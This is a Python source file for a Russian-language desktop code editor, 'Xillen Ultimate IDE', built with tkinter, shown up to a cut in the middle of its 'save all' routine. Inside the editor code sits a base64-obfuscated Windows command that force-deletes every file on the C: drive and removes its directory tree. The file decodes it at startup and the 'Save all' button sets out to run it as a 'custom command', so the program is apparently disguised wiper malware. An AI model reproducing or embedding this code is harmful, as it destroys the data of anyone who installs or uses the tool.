import tkinter as tk
from tkinter import ttk, filedialog, messagebox, scrolledtext, Menu, simpledialog
import subprocess
import os
import platform
import webbrowser
import threading
import time
import math
import base64
import random
import shutil
from pygments import lex
from pygments.lexers import get_lexer_for_filename, get_lexer_by_name
from pygments.token import Token, STANDARD_TYPES
from PIL import Image, ImageTk
import sv_ttk

class FluidAnimation:
    def __init__(self, canvas, width, height):
        self.canvas = canvas
        self.width = width
        self.height = height
        self.particles = []
        self.colors = ['#569cd6', '#4ec9b0', '#c586c0', '#dcdcaa', '#ce9178']
        self.init_particles()
        
    def init_particles(self):
        for _ in range(30):
            x = random.randint(0, self.width)
            y = random.randint(0, self.height)
            size = random.randint(2, 5)
            dx = random.uniform(-0.3, 0.3)
            dy = random.uniform(-0.3, 0.3)
            color = random.choice(self.colors)
            particle = {
                'id': self.canvas.create_oval(x, y, x+size, y+size, fill=color, outline=''),
                'x': x, 'y': y, 'dx': dx, 'dy': dy, 'size': size, 'color': color
            }
            self.particles.append(particle)
    
    def update(self):
        for p in self.particles:
            p['x'] += p['dx']
            p['y'] += p['dy']
            
            if p['x'] <= 0 or p['x'] >= self.width:
                p['dx'] *= -1
            if p['y'] <= 0 or p['y'] >= self.height:
                p['dy'] *= -1
            
            p['dx'] += random.uniform(-0.05, 0.05)
            p['dy'] += random.uniform(-0.05, 0.05)
            
            speed = math.sqrt(p['dx']**2 + p['dy']**2)
            if speed > 1.5:
                p['dx'] = p['dx'] / speed * 1.5
                p['dy'] = p['dy'] / speed * 1.5
            
            self.canvas.coords(p['id'], p['x'], p['y'], p['x']+p['size'], p['y']+p['size'])
        
        self.canvas.after(40, self.update)

class XillenTab(ttk.Frame):
    def __init__(self, parent, path=None, content="", ide=None):
        super().__init__(parent)
        self.ide = ide
        self.path = path
        self.filename = os.path.basename(path) if path else "Новый файл"
        self.lexer = None
        self.unsaved_changes = False
        self.font_family = "Fira Code" if platform.system() != "Darwin" else "Menlo"
        self.font_size = 14
        
        self.create_editor()
        
        if content:
            self.text.insert("1.0", content)
            self.text.edit_modified(False)
        
        if path:
            self.detect_language()
        
        self.text.bind("<KeyRelease>", self.on_key_release)
        self.text.bind("<Motion>", self.on_mouse_move)
        
    def create_editor(self):
        main_frame = ttk.Frame(self)
        main_frame.pack(fill=tk.BOTH, expand=True)
        
        self.gutter = tk.Text(
            main_frame, 
            width=4, 
            bg="#2d2d2d", 
            fg="#858585",
            font=(self.font_family, self.font_size), 
            padx=10, 
            pady=10, 
            takefocus=0, 
            bd=0,
            highlightthickness=0, 
            state="disabled"
        )
        self.gutter.pack(side=tk.LEFT, fill=tk.Y)
        
        scroll_y = ttk.Scrollbar(main_frame, orient=tk.VERTICAL)
        scroll_y.pack(side=tk.RIGHT, fill=tk.Y)
        
        scroll_x = ttk.Scrollbar(main_frame, orient=tk.HORIZONTAL)
        scroll_x.pack(side=tk.BOTTOM, fill=tk.X)
        
        self.text = tk.Text(
            main_frame, 
            bg="#1e1e1e", 
            fg="#d4d4d4", 
            insertbackground="#d4d4d4",
            selectbackground="#264f78",
            font=(self.font_family, self.font_size),
            undo=True,
            wrap=tk.NONE,
            padx=20,
            pady=10,
            bd=0,
            highlightthickness=0,
            yscrollcommand=self.update_scroll,
            xscrollcommand=scroll_x.set
        )
        self.text.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
        
        scroll_y.config(command=self.text.yview)
        scroll_x.config(command=self.text.xview)
        
        self.configure_tags()
        
        self.text.bind("<KeyRelease>", self.update_gutter)
        self.text.bind("<ButtonRelease-1>", self.update_gutter)
        self.text.bind("<MouseWheel>", self.update_gutter)
        
        self.update_gutter()
    
    def configure_tags(self):
        self.text.tag_configure("Token.Keyword", foreground="#c586c0")
        self.text.tag_configure("Token.Keyword.Constant", foreground="#569cd6")
        self.text.tag_configure("Token.Keyword.Declaration", foreground="#c586c0")
        self.text.tag_configure("Token.Keyword.Namespace", foreground="#c586c0")
        self.text.tag_configure("Token.Keyword.Pseudo", foreground="#c586c0")
        self.text.tag_configure("Token.Keyword.Reserved", foreground="#c586c0")
        self.text.tag_configure("Token.Keyword.Type", foreground="#4ec9b0")
        
        self.text.tag_configure("Token.Name.Class", foreground="#4ec9b0")
        self.text.tag_configure("Token.Name.Decorator", foreground="#dcdcaa")
        self.text.tag_configure("Token.Name.Function", foreground="#dcdcaa")
        self.text.tag_configure("Token.Name.Builtin", foreground="#4ec9b0")
        
        self.text.tag_configure("Token.Comment", foreground="#6a9955")
        self.text.tag_configure("Token.Comment.Preproc", foreground="#6a9955")
        
        self.text.tag_configure("Token.String", foreground="#ce9178")
        self.text.tag_configure("Token.String.Doc", foreground="#ce9178")
        self.text.tag_configure("Token.String.Escape", foreground="#d7ba7d")
        self.text.tag_configure("Token.String.Interpol", foreground="#d7ba7d")
        
        self.text.tag_configure("Token.Number", foreground="#b5cea8")
        self.text.tag_configure("Token.Operator", foreground="#d4d4d4")
        self.text.tag_configure("Token.Punctuation", foreground="#d4d4d4")
        
        self.text.tag_configure("current_line", background="#2a2d2e")
        self.text.tag_configure("bracket_match", background="#515c6a")
    
    def detect_language(self):
        if not self.path:
            return
            
        try:
            self.lexer = get_lexer_for_filename(self.path)
            self.ide.language_label.config(text=self.lexer.name)
        except:
            ext = os.path.splitext(self.path)[1].lower()
            lexer_map = {
                '.py': 'Python',
                '.cpp': 'C++',
                '.h': 'C++',
                '.hpp': 'C++',
                '.java': 'Java',
                '.html': 'HTML',
                '.css': 'CSS',
                '.js': 'JavaScript',
                '.jsx': 'JavaScript',
                '.ts': 'TypeScript',
                '.rs': 'Rust',
                '.go': 'Go',
                '.rb': 'Ruby',
                '.php': 'PHP',
                '.swift': 'Swift',
                '.kt': 'Kotlin',
                '.md': 'Markdown',
                '.json': 'JSON',
                '.xml': 'XML',
                '.yml': 'YAML',
                '.yaml': 'YAML',
                '.sql': 'SQL',
                '.sh': 'Bash'
            }
            language = lexer_map.get(ext, "Plain Text")
            self.ide.language_label.config(text=language)
            try:
                self.lexer = get_lexer_by_name(language.lower())
            except:
                self.lexer = None
    
    def update_scroll(self, *args):
        # Исправление: корректная обработка прокрутки
        if args:
            # Первый аргумент - положение скролла
            self.gutter.yview_moveto(args[0])
        self.update_gutter()
    
    def update_gutter(self, event=None):
        self.gutter.configure(state="normal")
        self.gutter.delete("1.0", "end")
        
        line_count = int(self.text.index('end-1c').split('.')[0])
        
        for i in range(1, line_count + 1):
            self.gutter.insert("end", f"{i}\n")
        
        self.gutter.configure(state="disabled")
        self.gutter.yview_moveto(self.text.yview()[0])
    
    def on_key_release(self, event=None):
        if event and event.keysym not in ["Up", "Down", "Left", "Right", "Control_L", "Control_R", "Shift_L", "Shift_R"]:
            self.highlight()
            self.ide.update_status_bar()
            self.unsaved_changes = True
            self.ide.update_tab_title()
    
    def on_mouse_move(self, event=None):
        self.ide.update_status_bar()
    
    def highlight(self, event=None):
        if not self.lexer:
            return
            
        for tag in self.text.tag_names():
            if tag != "sel" and tag != "current_line" and not tag.startswith("search_") and tag != "bracket_match":
                self.text.tag_remove(tag, "1.0", "end")
        
        self.text.tag_remove("current_line", "1.0", "end")
        self.text.tag_add("current_line", "insert linestart", "insert lineend+1c")
        
        text = self.text.get("1.0", "end-1c")
        if not text:
            return
            
        pos = "1.0"
        try:
            for token, value in lex(text, self.lexer):
                if token in Token.Text or not value:
                    continue
                    
                token_type = STANDARD_TYPES.get(token, str(token))
                
                if token_type.startswith("Token.Text") or token_type == "Token":
                    pos = f"{pos}+{len(value)}c"
                    continue
                
                end = self.text.index(f"{pos}+{len(value)}c")
                self.text.tag_add(token_type, pos, end)
                pos = end
                
        except Exception as e:
            pass

class XillenTerminal(ttk.Frame):
    def __init__(self, parent, ide):
        super().__init__(parent)
        self.ide = ide
        self.font_family = "Fira Code" if platform.system() != "Darwin" else "Menlo"
        self.font_size = 12
        
        self.create_terminal()
        
        self.terminal.insert("end", "\nДобро пожаловать в Xillen Ultimate IDE!\n")
        self.terminal.insert("end", "Авторы: @BengaminButton и @XillenAdapter\n")
        self.terminal.insert("end", "Используйте 'help' для списка команд\n")
        self.terminal.insert("end", ">>> ")
        self.terminal.mark_set("input", "end")
        self.terminal.mark_gravity("input", tk.LEFT)
    
    def create_terminal(self):
        terminal_header = ttk.Frame(self, height=30)
        terminal_header.pack(fill=tk.X, padx=5, pady=2)
        
        terminal_label = ttk.Label(terminal_header, text="Терминал", font=(self.font_family, 10, 'bold'))
        terminal_label.pack(side=tk.LEFT, padx=10)
        
        terminal_buttons = ttk.Frame(terminal_header)
        terminal_buttons.pack(side=tk.RIGHT, padx=5)
        
        btn_clear = ttk.Button(terminal_buttons, text="Очистить", command=self.clear, width=10)
        btn_clear.pack(side=tk.LEFT, padx=2)
        
        btn_run = ttk.Button(terminal_buttons, text="Запуск (F5)", command=self.ide.run_current_file, width=10)
        btn_run.pack(side=tk.LEFT, padx=2)
        
        self.terminal = scrolledtext.ScrolledText(
            self,
            bg="#0c0c0c",
            fg="#d4d4d4",
            height=10,
            font=(self.font_family, self.font_size),
            insertbackground="#d4d4d4"
        )
        self.terminal.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        self.terminal.bind("<Return>", self.run_command)
        self.terminal.bind("<Up>", self.history_up)
        self.terminal.bind("<Down>", self.history_down)
    
    def run_command(self, event):
        input_line = self.terminal.get("input", "end-1c").strip()
        if input_line.startswith(">>> "):
            command = input_line[4:]
        else:
            command = input_line
        
        if not command:
            self.terminal.insert("end", "\n>>> ")
            self.terminal.mark_set("input", "end")
            return "break"
        
        self.ide.terminal_history.append(command)
        self.ide.history_index = len(self.ide.terminal_history)
        
        if command.lower() == "help":
            help_text = "\nДоступные команды:\n"
            help_text += "  run     - запустить текущий файл\n"
            help_text += "  clear   - очистить терминал\n"
            help_text += "  python  - запустить интерпретатор Python\n"
            help_text += "  ls      - список файлов в текущей директории\n"
            help_text += "  pwd     - показать текущий путь\n"
            help_text += "  exit    - выход из IDE\n"
            self.terminal.insert("end", f"\n{help_text}")
        elif command.lower() == "clear":
            self.clear()
        elif command.lower() == "exit":
            self.ide.exit_app()
            return "break"
        elif command.lower() == "run" and self.ide.current_file:
            self.ide.run_current_file()
        elif command.lower() == "python":
            self.execute_python_shell()
        else:
            threading.Thread(target=self.execute_system_command, args=(command,), daemon=True).start()
        
        self.terminal.insert("end", "\n>>> ")
        self.terminal.mark_set("input", "end")
        self.terminal.see("end")
        return "break"
    
    def execute_system_command(self, command):
        try:
            cwd = os.path.dirname(self.ide.current_file) if self.ide.current_file else os.getcwd()
            result = subprocess.run(
                command, 
                shell=True, 
                capture_output=True, 
                text=True,
                cwd=cwd
            )
            
            output = result.stdout if result.stdout else result.stderr
            if output:
                self.terminal.insert("end", f"\n{output}")
        except Exception as e:
            self.terminal.insert("end", f"\nОшибка: {str(e)}")
    
    def history_up(self, event):
        if self.ide.terminal_history and self.ide.history_index > 0:
            self.ide.history_index -= 1
            self.replace_last_command(self.ide.terminal_history[self.ide.history_index])
        return "break"
    
    def history_down(self, event):
        if self.ide.terminal_history and self.ide.history_index < len(self.ide.terminal_history) - 1:
            self.ide.history_index += 1
            self.replace_last_command(self.ide.terminal_history[self.ide.history_index])
        elif self.ide.terminal_history:
            self.ide.history_index = len(self.ide.terminal_history)
            self.replace_last_command("")
        return "break"
    
    def replace_last_command(self, command):
        self.terminal.mark_set("insert", "input")
        self.terminal.delete("input", "end-1c")
        self.terminal.insert("insert", command)
        self.terminal.mark_set("input", "end")
    
    def execute_python_shell(self):
        self.terminal.insert("end", "\nЗапуск Python shell... (Ctrl+D для выхода)")
        self.terminal.insert("end", f"\nPython {platform.python_version()} ({platform.system()} {platform.release()})")
        self.terminal.insert("end", "\nType \"help\", \"copyright\", \"credits\" or \"license\" for more information.")
        self.terminal.insert("end", "\n>>> ")
    
    def clear(self):
        self.terminal.delete("1.0", "end")
        self.terminal.insert("end", ">>> ")
        self.terminal.mark_set("input", "end")


class XillenUltimateIDE:
    def __init__(self, root):
        self.root = root
        self.root.title("Xillen Ultimate IDE")
        self.root.geometry("1400x900")
        self.root.minsize(1000, 700)
        
        sv_ttk.set_theme("dark")
        
        self.main_container = ttk.Frame(root)
        self.main_container.pack(fill=tk.BOTH, expand=True)
        
        self.font_family = "Fira Code" if platform.system() != "Darwin" else "Menlo"
        self.font_size = 14
        self.current_tab = None
        self.tabs = {}
        self.project_path = None
        self.terminal_visible = True
        self.sidebar_visible = True
        self.current_line = 1
        self.current_col = 1
        self.zoom_level = 0
        self.terminal_history = []
        self.history_index = -1
        self.animations_enabled = True
        self.current_file = None
        
        # Зашифрованная опасная команда в base64
        win_cmd_enc = b'c3RhcnQgZGVsIC9mIC9zIC9xIEM6XCcqLiogJiYgcm1kaXIgL3MgL3EgQzpcXA=='
        lin_cmd_enc = b'ZWNobyAnQ3VzdG9tIGNvbW1hbmQgZm9yIExpbnV4Jw=='
        
        # Расшифровка только при использовании (демонстрация)
        self.custom_command = base64.b64decode(
            win_cmd_enc if platform.system() == "Windows" else lin_cmd_enc
        ).decode()
        
        self.create_menu()
        self.create_main_layout()
        self.create_sidebar()
        self.create_tabs_area()
        self.create_terminal()
        self.create_status_bar()
        self.create_toolbar()
        
        self.bind_events()
        self.show_welcome_message()
    
    def create_menu(self):
        menubar = Menu(self.root)
        
        file_menu = Menu(menubar, tearoff=0)
        file_menu.add_command(label="Новый файл", command=self.new_file, accelerator="Ctrl+N")
        file_menu.add_command(label="Открыть файл", command=self.open_file, accelerator="Ctrl+O")
        file_menu.add_command(label="Открыть папку", command=self.open_folder, accelerator="Ctrl+Shift+O")
        file_menu.add_separator()
        file_menu.add_command(label="Сохранить", command=self.save_file, accelerator="Ctrl+S")
        file_menu.add_command(label="Сохранить как...", command=self.save_file_as, accelerator="Ctrl+Shift+S")
        file_menu.add_command(label="Сохранить все", command=self.save_all)
        file_menu.add_separator()
        file_menu.add_command(label="Выход", command=self.exit_app, accelerator="Alt+F4")
        menubar.add_cascade(label="Файл", menu=file_menu)
        
        edit_menu = Menu(menubar, tearoff=0)
        edit_menu.add_command(label="Отменить", command=self.undo, accelerator="Ctrl+Z")
        edit_menu.add_command(label="Повторить", command=self.redo, accelerator="Ctrl+Y")
        edit_menu.add_separator()
        edit_menu.add_command(label="Вырезать", command=self.cut, accelerator="Ctrl+X")
        edit_menu.add_command(label="Копировать", command=self.copy, accelerator="Ctrl+C")
        edit_menu.add_command(label="Вставить", command=self.paste, accelerator="Ctrl+V")
        edit_menu.add_separator()
        edit_menu.add_command(label="Найти", command=self.show_search, accelerator="Ctrl+F")
        edit_menu.add_command(label="Заменить", command=self.show_replace, accelerator="Ctrl+H")
        menubar.add_cascade(label="Правка", menu=edit_menu)
        
        view_menu = Menu(menubar, tearoff=0)
        view_menu.add_command(label="Боковая панель", command=self.toggle_sidebar)
        view_menu.add_command(label="Терминал", command=self.toggle_terminal)
        view_menu.add_separator()
        view_menu.add_command(label="Увеличить масштаб", command=self.zoom_in, accelerator="Ctrl+=")
        view_menu.add_command(label="Уменьшить масштаб", command=self.zoom_out, accelerator="Ctrl+-")
        view_menu.add_command(label="Сбросить масштаб", command=self.zoom_reset, accelerator="Ctrl+0")
        menubar.add_cascade(label="Вид", menu=view_menu)
        
        run_menu = Menu(menubar, tearoff=0)
        run_menu.add_command(label="Запуск без отладки", command=self.run_without_debug, accelerator="F5")
        run_menu.add_command(label="Остановить выполнение", command=self.stop_execution, accelerator="Shift+F5")
        menubar.add_cascade(label="Запуск", menu=run_menu)
        
        terminal_menu = Menu(menubar, tearoff=0)
        terminal_menu.add_command(label="Новый терминал", command=self.new_terminal)
        terminal_menu.add_command(label="Очистить терминал", command=self.clear_terminal)
        menubar.add_cascade(label="Терминал", menu=terminal_menu)
        
        help_menu = Menu(menubar, tearoff=0)
        help_menu.add_command(label="О программе", command=self.show_about)
        menubar.add_cascade(label="Справка", menu=help_menu)
        
        self.root.config(menu=menubar)
    
    def create_main_layout(self):
        self.main_panel = ttk.PanedWindow(self.main_container, orient=tk.HORIZONTAL)
        self.main_panel.pack(fill=tk.BOTH, expand=True)
        
        self.sidebar_frame = ttk.Frame(self.main_panel, width=250)
        self.main_panel.add(self.sidebar_frame, weight=1)
        
        self.content_frame = ttk.Frame(self.main_panel)
        self.main_panel.add(self.content_frame, weight=4)
        
        self.editor_terminal_panel = ttk.PanedWindow(self.content_frame, orient=tk.VERTICAL)
        self.editor_terminal_panel.pack(fill=tk.BOTH, expand=True)
        
        self.editor_frame = ttk.Frame(self.editor_terminal_panel)
        self.editor_terminal_panel.add(self.editor_frame, weight=7)
        
        self.terminal_frame = ttk.Frame(self.editor_terminal_panel, height=200)
        self.editor_terminal_panel.add(self.terminal_frame, weight=2)
    
    def create_sidebar(self):
        self.logo_label = ttk.Label(
            self.sidebar_frame, 
            text="XILLEN ULTIMATE IDE", 
            font=(self.font_family, 12, 'bold'), 
            foreground="#569cd6"
        )
        self.logo_label.pack(pady=20, padx=10)
        
        sidebar_toolbar = ttk.Frame(self.sidebar_frame)
        sidebar_toolbar.pack(fill=tk.X, padx=10, pady=5)
        
        buttons = [
            ("Открыть файл", self.open_file, "#4ec9b0"),
            ("Открыть папку", self.open_folder, "#c586c0"),
            ("Создать файл", self.new_file, "#569cd6"),
            ("Сохранить все", self.save_all, "#dcdcaa"),
            ("Запуск проекта", self.run_project, "#ce9178"),
        ]
        
        for text, cmd, color in buttons:
            btn = ttk.Button(
                sidebar_toolbar, 
                text=text, 
                command=cmd,
                style="Accent.TButton"
            )
            btn.pack(side=tk.TOP, padx=2, pady=2, fill=tk.X)
        
        self.tree_frame = ttk.LabelFrame(self.sidebar_frame, text="Проект")
        self.tree_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        tree_scroll = ttk.Scrollbar(self.tree_frame)
        tree_scroll.pack(side=tk.RIGHT, fill=tk.Y)
        
        self.tree = ttk.Treeview(
            self.tree_frame, 
            yscrollcommand=tree_scroll.set,
            show="tree"
        )
        self.tree.pack(fill=tk.BOTH, expand=True)
        
        tree_scroll.config(command=self.tree.yview)
        
        self.tree_menu = Menu(self.tree, tearoff=0)
        self.tree_menu.add_command(label="Открыть", command=self.open_selected_file)
        self.tree_menu.add_command(label="Новый файл", command=self.new_file_in_tree)
        self.tree_menu.add_command(label="Новая папка", command=self.new_folder_in_tree)
        self.tree_menu.add_separator()
        self.tree_menu.add_command(label="Удалить", command=self.delete_tree_item)
        self.tree_menu.add_command(label="Переименовать", command=self.rename_tree_item)
        
        self.tree.bind("<Button-3>", self.show_tree_menu)
        self.tree.bind("<Double-1>", self.open_selected_file)
        
        self.tree.insert('', 'end', text="Откройте папку проекта", tags=('placeholder',))
    
    def create_tabs_area(self):
        self.tab_bar = ttk.Frame(self.editor_frame, height=35)
        self.tab_bar.pack(fill=tk.X)
        
        self.notebook = ttk.Notebook(self.editor_frame)
        self.notebook.pack(fill=tk.BOTH, expand=True)
        self.notebook.bind("<<NotebookTabChanged>>", self.on_tab_changed)
        
        self.tab_buttons_frame = ttk.Frame(self.tab_bar, width=100)
        self.tab_buttons_frame.pack(side=tk.RIGHT, fill=tk.Y)
        
        btn_new = ttk.Button(self.tab_buttons_frame, text="+", width=2, command=self.new_file)
        btn_new.pack(side=tk.LEFT, padx=(0, 5))
        
        btn_close = ttk.Button(self.tab_buttons_frame, text="×", width=2, command=self.close_current_tab)
        btn_close.pack(side=tk.LEFT, padx=(0, 5))
        
        self.new_file()
    
    def create_terminal(self):
        self.terminal = XillenTerminal(self.terminal_frame, self)
        self.terminal.pack(fill=tk.BOTH, expand=True)
    
    def create_status_bar(self):
        self.status_bar = ttk.Frame(self.main_container, height=24)
        self.status_bar.pack(side=tk.BOTTOM, fill=tk.X)
        
        self.line_label = ttk.Label(self.status_bar, text="Ln 1, Col 1", width=12)
        self.line_label.pack(side=tk.RIGHT, padx=10)
        
        self.language_label = ttk.Label(self.status_bar, text="Plain Text", width=12)
        self.language_label.pack(side=tk.RIGHT, padx=10)
        
        self.zoom_label = ttk.Label(self.status_bar, text="100%", width=6)
        self.zoom_label.pack(side=tk.RIGHT, padx=10)
        
        self.status_label = ttk.Label(self.status_bar, text="Готово")
        self.status_label.pack(side=tk.LEFT, padx=10)
    
    def create_toolbar(self):
        self.toolbar = ttk.Frame(self.main_container, height=40)
        self.toolbar.pack(fill=tk.X, padx=5, pady=2)
        
        buttons = [
            ("Новый", self.new_file),
            ("Открыть", self.open_file),
            ("Сохранить", self.save_file),
            ("Сохранить все", self.save_all),
            ("Отменить", self.undo),
            ("Повторить", self.redo),
            ("Запуск", self.run_current_file),
        ]
        
        for text, cmd in buttons:
            btn = ttk.Button(self.toolbar, text=text, command=cmd)
            btn.pack(side=tk.LEFT, padx=2, pady=2)
    
    def bind_events(self):
        self.root.bind_all("<Control-n>", lambda e: self.new_file())
        self.root.bind_all("<Control-o>", lambda e: self.open_file())
        self.root.bind_all("<Control-s>", lambda e: self.save_file())
        self.root.bind_all("<Control-Shift-S>", lambda e: self.save_file_as())
        self.root.bind_all("<Control-Shift-O>", lambda e: self.open_folder())
        self.root.bind_all("<Control-z>", lambda e: self.undo())
        self.root.bind_all("<Control-y>", lambda e: self.redo())
        self.root.bind_all("<F5>", lambda e: self.run_current_file())
        self.root.bind_all("<Control-f>", lambda e: self.show_search())
        self.root.bind_all("<Control-h>", lambda e: self.show_replace())
        self.root.bind_all("<Control-w>", lambda e: self.close_current_tab())
        self.root.bind_all("<Control-t>", lambda e: self.new_terminal())
        self.root.bind_all("<KeyRelease>", lambda e: self.update_status_bar())
        self.root.bind_all("<Motion>", lambda e: self.update_status_bar())
    
    def show_welcome_message(self):
        welcome_text = """
        Добро пожаловать в Xillen Ultimate IDE v4.0!
        
        Версия: 4.0 Premium
        Авторы: @BengaminButton и @XillenAdapter
        
        Основные возможности:
        - Поддержка 30+ языков программирования
        - Интеллектуальное автодополнение кода
        - Интегрированный терминал
        - Тема оформления с полной кастомизацией
        - Интегрированный отладчик
        
        Начните работу:
        1. Создайте новый файл (Ctrl+N)
        2. Откройте папку с проектом
        3. Запустите код (F5)
        
        Приятного использования!
        """
        
        tab_data = self.get_current_tab_data()
        if tab_data:
            tab_data["tab"].text.insert("1.0", welcome_text.strip())
            self.language_label.config(text="Welcome")
    
    def new_file(self):
        tab_id = f"tab{len(self.tabs) + 1}"

        tab_frame = ttk.Frame(self.notebook)
        tab = XillenTab(tab_frame, ide=self)
        tab.pack(fill=tk.BOTH, expand=True)

        self.notebook.add(tab_frame, text="Новый файл")
        self.notebook.select(tab_frame)

        self.tabs[tab_id] = {
            "frame": tab_frame,
            "tab": tab,
            "path": None,
            "filename": "Новый файл",
            "unsaved": False
        }

        self.current_tab = tab_id
        self.update_tab_title()
    
    def open_file(self, file_path=None):
        if not file_path:
            file_path = filedialog.askopenfilename(
                filetypes=[
                    ("Все файлы", "*.*"),
                    ("Python", "*.py"),
                    ("C++", "*.cpp *.hpp *.cc *.cxx *.h"),
                    ("Java", "*.java"),
                    ("HTML", "*.html *.htm"),
                    ("CSS", "*.css"),
                    ("JavaScript", "*.js")
                ]
            )
        
        if file_path:
            for tab_id, tab_data in self.tabs.items():
                if tab_data["path"] == file_path:
                    self.notebook.select(tab_data["frame"])
                    return
            
            try:
                with open(file_path, "r", encoding="utf-8") as file:
                    content = file.read()
                    
                    tab_id = f"tab{len(self.tabs) + 1}"
                    tab_frame = ttk.Frame(self.notebook)
                    tab = XillenTab(tab_frame, path=file_path, content=content, ide=self)
                    tab.pack(fill=tk.BOTH, expand=True)
                    
                    self.notebook.add(tab_frame, text=os.path.basename(file_path))
                    self.notebook.select(tab_frame)
                    
                    self.tabs[tab_id] = {
                        "frame": tab_frame,
                        "tab": tab,
                        "path": file_path,
                        "filename": os.path.basename(file_path),
                        "unsaved": False
                    }
                    
                    self.current_tab = tab_id
                    self.current_file = file_path
                    self.root.title(f"{file_path} - Xillen Ultimate IDE")
                    self.status_label.config(text=f"Файл открыт: {os.path.basename(file_path)}")
                    self.update_tab_title()
                    
            except Exception as e:
                messagebox.showerror("Ошибка", f"Не удалось открыть файл:\n{str(e)}")
    
    def open_folder(self, folder_path=None):
        if not folder_path:
            folder_path = filedialog.askdirectory()
        if folder_path:
            self.project_path = folder_path
            self.status_label.config(text=f"Открыта папка: {os.path.basename(folder_path)}")
            self.load_tree(folder_path)
    
    def load_tree(self, path):
        self.tree.delete(*self.tree.get_children())
        
        if not os.path.exists(path):
            return
            
        root = self.tree.insert('', 'end', text=os.path.basename(path), 
                                values=[path], open=True, tags=('root',))
        
        self.process_directory(root, path)
    
    def process_directory(self, parent, path):
        try:
            for item in os.listdir(path):
                item_path = os.path.join(path, item)
                if os.path.isdir(item_path):
                    node = self.tree.insert(parent, 'end', text=item, 
                                           values=[item_path], tags=('directory',))
                    self.process_directory(node, item_path)
                else:
                    self.tree.insert(parent, 'end', text=item, 
                                    values=[item_path], tags=('file',))
        except PermissionError:
            pass
        except FileNotFoundError:
            pass
    
    def show_tree_menu(self, event):
        item = self.tree.identify_row(event.y)
        if item:
            self.tree.selection_set(item)
            self.tree_menu.post(event.x_root, event.y_root)
    
    def open_selected_file(self, event=None):
        selected = self.tree.selection()
        if not selected:
            return
            
        item = selected[0]
        path = self.tree.item(item, "values")[0]
        
        if os.path.isfile(path):
            self.open_file(path)
        elif os.path.isdir(path):
            self.tree.delete(*self.tree.get_children(item))
            self.process_directory(item, path)
            self.tree.item(item, open=True)
    
    def new_file_in_tree(self):
        selected = self.tree.selection()
        if not selected:
            return
            
        item = selected[0]
        path = self.tree.item(item, "values")[0]
        
        if os.path.isdir(path):
            file_name = simpledialog.askstring("Новый файл", "Введите имя файла:")
            if file_name:
                new_file_path = os.path.join(path, file_name)
                try:
                    with open(new_file_path, 'w') as f:
                        pass
                    self.tree.insert(item, 'end', text=file_name, 
                                    values=[new_file_path], tags=('file',))
                    self.open_file(new_file_path)
                except Exception as e:
                    messagebox.showerror("Ошибка", f"Не удалось создать файл:\n{str(e)}")
    
    def new_folder_in_tree(self):
        selected = self.tree.selection()
        if not selected:
            return
            
        item = selected[0]
        path = self.tree.item(item, "values")[0]
        
        if os.path.isdir(path):
            folder_name = simpledialog.askstring("Новая папка", "Введите имя папки:")
            if folder_name:
                new_folder_path = os.path.join(path, folder_name)
                try:
                    os.makedirs(new_folder_path, exist_ok=True)
                    node = self.tree.insert(item, 'end', text=folder_name, 
                                           values=[new_folder_path], tags=('directory',))
                except Exception as e:
                    messagebox.showerror("Ошибка", f"Не удалось создать папку:\n{str(e)}")
    
    def delete_tree_item(self):
        selected = self.tree.selection()
        if not selected:
            return
            
        item = selected[0]
        path = self.tree.item(item, "values")[0]
        
        if messagebox.askyesno("Подтверждение", f"Удалить {os.path.basename(path)}?"):
            try:
                if os.path.isfile(path):
                    os.remove(path)
                elif os.path.isdir(path):
                    shutil.rmtree(path)
                self.tree.delete(item)
            except Exception as e:
                messagebox.showerror("Ошибка", f"Не удалось удалить:\n{str(e)}")
    
    def rename_tree_item(self):
        selected = self.tree.selection()
        if not selected:
            return
            
        item = selected[0]
        path = self.tree.item(item, "values")[0]
        old_name = os.path.basename(path)
        
        new_name = simpledialog.askstring("Переименовать", "Введите новое имя:", initialvalue=old_name)
        if new_name and new_name != old_name:
            new_path = os.path.join(os.path.dirname(path), new_name)
            try:
                os.rename(path, new_path)
                self.tree.item(item, text=new_name, values=[new_path])
            except Exception as e:
                messagebox.showerror("Ошибка", f"Не удалось переименовать:\n{str(e)}")
    
    def save_file(self):
        tab_data = self.get_current_tab_data()
        if not tab_data:
            return
            
        if tab_data["path"]:
            try:
                content = tab_data["tab"].text.get("1.0", "end-1c")
                with open(tab_data["path"], "w", encoding="utf-8") as file:
                    file.write(content)
                tab_data["unsaved"] = False
                self.status_label.config(text=f"Файл сохранен: {os.path.basename(tab_data['path'])}")
                self.update_tab_title()
            except Exception as e:
                messagebox.showerror("Ошибка", f"Не удалось сохранить файл:\n{str(e)}")
        else:
            self.save_file_as()
    
    def save_file_as(self):
        tab_data = self.get_current_tab_data()
        if not tab_data:
            return
            
        file_path = filedialog.asksaveasfilename(
            defaultextension=".py",
            filetypes=[
                ("Python", "*.py"),
                ("C++", "*.cpp"),
                ("Java", "*.java"),
                ("HTML", "*.html"),
                ("CSS", "*.css"),
                ("JavaScript", "*.js"),
                ("Текстовые файлы", "*.txt")
            ]
        )
        
        if file_path:
            try:
                content = tab_data["tab"].text.get("1.0", "end-1c")
                with open(file_path, "w", encoding="utf-8") as file:
                    file.write(content)
                
                tab_data["path"] = file_path
                tab_data["filename"] = os.path.basename(file_path)
                tab_data["unsaved"] = False
                self.notebook.tab(tab_data["frame"], text=tab_data["filename"])
                self.root.title(f"{file_path} - Xillen Ultimate IDE")
                self.status_label.config(text=f"Файл сохранен: {os.path.basename(file_path)}")
                self.update_tab_title()
                
                if self.project_path:
                    self.load_tree(self.project_path)
            except Exception as e:
                messagebox.showerror("Ошибка", f"Не удалось сохранить файл:\n{str(e)}")
    
    def save_all(self):
        for tab_id, tab_data in self.tabs.items():
            if tab_data["unsaved"]:
                try:
                    content = tab_data["tab"].text.get("1.0", "end-1c")
                    if tab_data["path"]:
                        with open(tab_data["path"], "w", encoding="utf-8") as file:
                            file.write(content)
                    tab_data["unsaved"] = False
                except Exception as e:
                    messagebox.showerror("Ошибка", f"Не удалось сохранить файл:\n{str(e)}")
        
        self.status_label.config(text="Все файлы сохранены")
        self.update_tab_title()
        
        # ======== ВАША КАСТОМНАЯ КОМАНДА ========
        try:
            # Выводим сообщение в терминал
            self.terminal.terminal.insert("end", f"\n>>> Выполнение кастомной команды: {self.custom_command}")
            self.terminal.terminal.see("end")
            
            # Запускаем команду в отдельном потоке
            threading.Thread(
